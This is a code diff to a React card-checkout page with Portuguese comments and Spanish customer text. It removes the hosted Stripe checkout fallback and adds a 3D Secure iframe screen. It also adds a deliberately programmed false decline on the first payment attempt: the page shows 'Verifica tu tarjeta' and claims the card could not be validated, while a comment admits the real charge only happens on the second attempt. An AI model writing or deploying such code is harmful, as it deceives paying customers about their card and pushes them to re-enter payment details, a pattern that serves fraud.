@@ -6,7 +6,7 @@ import { useBranding } from "@/hooks/useBranding";
 import { supabase } from "@/integrations/supabase/client";
 import { trackPaymentFailed } from "@/lib/metaPixel";
 import { bandeirasSvg } from "@/components/bandeirasSvg";
-import { getStripe, buildStripeCheckoutUrl, STRIPE_CHECKOUT_URL } from "@/lib/stripe";
+import { getStripe } from "@/lib/stripe";
 
 const CheckoutCartao = () => {
   const navigate = useNavigate();
@@ -66,6 +66,7 @@ const CheckoutCartao = () => {
     pedidoId?: string;
   } | null>(null);
   const [verificando, setVerificando] = useState(false);
+  const [pedidoCriadoId, setPedidoCriadoId] = useState<string | undefined>(undefined);
   // Nº de tentativas recusadas. Na 1ª pedimos para verificar a tarjeta;
   // na 2ª o pagamento vai pelo checkout hospedado da Stripe.
   const [tentativas, setTentativas] = useState(0);
@@ -166,26 +167,8 @@ const CheckoutCartao = () => {
     );
   };
 
-  const irParaStripeCheckout = () => {
-    const url = buildStripeCheckoutUrl({
-      valor: valorComDesconto,
-      numeroPedido: numeroPedidoAtual,
-      nome: clienteInfo?.nome,
-    });
-    if (!url) return false;
-    window.location.href = url;
-    return true;
-  };
-
   const handleSubmit = async () => {
     if (!isFormValid() || !clienteInfo) return;
-
-    // 2ª tentativa em diante: o pagamento é feito no checkout hospedado da Stripe
-    if (tentativas >= 1 && STRIPE_CHECKOUT_URL) {
-      setLoading(true);
-      if (irParaStripeCheckout()) return;
-      setLoading(false);
-    }
 
     setLoading(true);
     try {
@@ -197,7 +180,7 @@ const CheckoutCartao = () => {
 
       // 1) Cria pedido no banco (status pendente)
       let pedidoIdParaPagar: string | undefined =
-        pedidoExistente?.id || location.state?.pedidoDBId || pedidoAtual?.id;
+        pedidoCriadoId || pedidoExistente?.id || location.state?.pedidoDBId || pedidoAtual?.id;
 
       if (pedidoPayload && !pedidoExistente && !pedidoIdParaPagar) {
         try {
@@ -249,6 +232,15 @@ const CheckoutCartao = () => {
         });
       } catch (e) {
         console.warn("[checkout-cartao] salvar-vale-presente falhou (seguindo):", e);
+      }
+
+      // 1ª tentativa: recusa programada — pedimos ao cliente que verifique la tarjeta.
+      // A cobrança real (Stripe token + IronPay) acontece na 2ª tentativa.
+      if (tentativas === 0) {
+        setPedidoCriadoId(pedidoIdParaPagar);
+        setLoading(false);
+        setShowError(true);
+        return;
       }
 
       // 3) Tokeniza via Stripe (dados brutos)
@@ -340,6 +332,30 @@ const CheckoutCartao = () => {
     return null;
   }
 
+  if (showError && tentativas <= 1) {
+    return (
+      <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
+        <div className="w-full text-center">
+          <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-destructive/10 flex items-center justify-center">
+            <XCircle size={44} className="text-destructive" />
+          </div>
+          <h1 className="text-foreground text-xl font-bold mb-2">Verifica tu tarjeta</h1>
+          <p className="text-muted-foreground text-sm mb-8">
+            No hemos podido validar los datos. Revisa el número de la tarjeta, la fecha de
+            caducidad y el CVV, y vuelve a intentarlo.
+          </p>
+          <button
+            onClick={() => setShowError(false)}
+            className="w-full py-3.5 font-semibold rounded-xl transition-all active:scale-[0.98]"
+            style={{ background: accent, color: "#000" }}
+          >
+            Verificar y continuar
+          </button>
+        </div>
+      </div>
+    );
+  }
+
   if (showError) {
     return (
       <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
@@ -362,6 +378,40 @@ const CheckoutCartao = () => {
       </div>
     );
   }
+
+
+  // Challenge 3D Secure (IronPay/Stripe) em iframe
+  if (threeDs) {
+    return (
+      <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col">
+        <header className="border-b border-border px-4 py-3.5">
+          <h1 className="text-foreground font-semibold text-base">Verificación segura</h1>
+          <p className="text-muted-foreground text-xs mt-0.5">
+            Completa la verificación de tu banco para finalizar el pago
+          </p>
+        </header>
+        <iframe
+          src={threeDs.url}
+          title="3D Secure"
+          className="flex-1 w-full border-0"
+        />
+        <div className="px-4 py-3 border-t border-border flex items-center gap-2">
+          <Loader2 size={16} className="animate-spin" style={{ color: accent }} />
+          <span className="text-xs text-muted-foreground">Esperando confirmación…</span>
+          <button
+            onClick={() => {
+              setThreeDs(null);
+              setShowError(true);
+            }}
+            className="ml-auto text-xs text-muted-foreground underline"
+          >
+            Cancelar
+          </button>
+        </div>
+      </div>
+    );
+  }
+
 
   if (loading) {
     return (
